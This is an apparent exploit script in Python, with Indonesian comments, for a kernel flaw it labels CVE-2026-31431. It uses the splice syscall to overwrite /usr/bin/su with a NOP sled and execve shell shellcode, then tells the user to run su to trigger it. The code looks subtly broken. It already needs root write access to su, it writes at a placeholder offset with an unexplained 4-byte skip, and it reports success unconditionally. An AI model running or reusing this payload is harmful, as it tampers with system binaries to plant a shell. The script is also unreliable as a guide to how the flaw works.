import os
import ctypes
import ctypes.util

# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

# Define splice syscall
# int splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags);
libc.splice.argtypes = [
    ctypes.c_int,           # fd_in
    ctypes.POINTER(ctypes.c_longlong),  # off_in
    ctypes.c_int,           # fd_out
    ctypes.POINTER(ctypes.c_longlong),  # off_out
    ctypes.c_size_t,        # len
    ctypes.c_uint           # flags
]
libc.splice.restype = ctypes.c_ssize_t

def splice(fd_in, fd_out, offset_out, length, offset_in=None):
    """Wrapper untuk splice syscall"""
    off_in = None
    if offset_in is not None:
        off_in = ctypes.c_longlong(offset_in)
        off_in_ptr = ctypes.byref(off_in)
    else:
        off_in_ptr = None
    
    off_out = ctypes.c_longlong(offset_out)
    off_out_ptr = ctypes.byref(off_out)
    
    result = libc.splice(
        fd_in,
        off_in_ptr,
        fd_out,
        off_out_ptr,
        length,
        0  # flags
    )
    
    if result < 0:
        errno = ctypes.get_errno()
        raise OSError(errno, os.strerror(errno))
    
    return result

def exploit_step(su_fd, offset, payload_chunk):
    """Exploit step untuk CVE-2026-31431"""
    # Create pipe
    read_pipe, write_pipe = os.pipe()
    
    try:
        # Write payload ke pipe
        os.write(write_pipe, payload_chunk)
        
        # Splice dari pipe ke su binary pada offset yang ditentukan
        bytes_written = splice(
            fd_in=read_pipe,
            fd_out=su_fd,
            offset_out=offset + 4,  # Skip 4 bytes dari offset
            length=len(payload_chunk)
        )
        
        print(f"[+] Written {bytes_written} bytes at offset {offset + 4}")
        
    finally:
        # Cleanup pipes
        os.close(read_pipe)
        os.close(write_pipe)

def main():
    # Path ke su binary (sesuaikan dengan sistem)
    su_path = "/usr/bin/su"
    
    # Payload yang akan ditulis (contoh: NOP sled + shellcode)
    # Sesuaikan dengan kebutuhan exploit
    payload = b"\x90" * 100  # NOP sled
    payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    payload += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  # execve shellcode
    
    # Buka su binary dengan O_RDWR
    try:
        su_fd = os.open(su_path, os.O_RDWR)
        print(f"[+] Opened {su_path} (fd={su_fd})")
    except PermissionError:
        print(f"[-] Permission denied: {su_path}")
        print("[!] Exploit requires write access to su binary")
        return
    except FileNotFoundError:
        print(f"[-] File not found: {su_path}")
        return
    
    try:
        # Target offset (sesuaikan dengan analisis binary)
        # Biasanya di .text section untuk overwrite instruksi
        base_offset = 0x1000  # Contoh offset
        
        # Write payload dalam chunks 4 bytes
        print(f"[*] Writing payload of {len(payload)} bytes...")
        for i in range(0, len(payload), 4):
            chunk = payload[i:i+4]
            if len(chunk) < 4:
                chunk += b"\x00" * (4 - len(chunk))  # Padding
            
            exploit_step(su_fd, base_offset + i, chunk)
        
        print("[+] Exploit completed successfully!")
        print(f"[*] Modified binary at: {su_path}")
        print("[!] Run 'su' to trigger the exploit")
        
    finally:
        os.close(su_fd)

if __name__ == "__main__":
    # Check if running as root (untuk write access ke /usr/bin/su)
    if os.geteuid() != 0:
        print("[!] Warning: This exploit typically requires root privileges")
        print("[!] to write to system binaries")
    
    main()
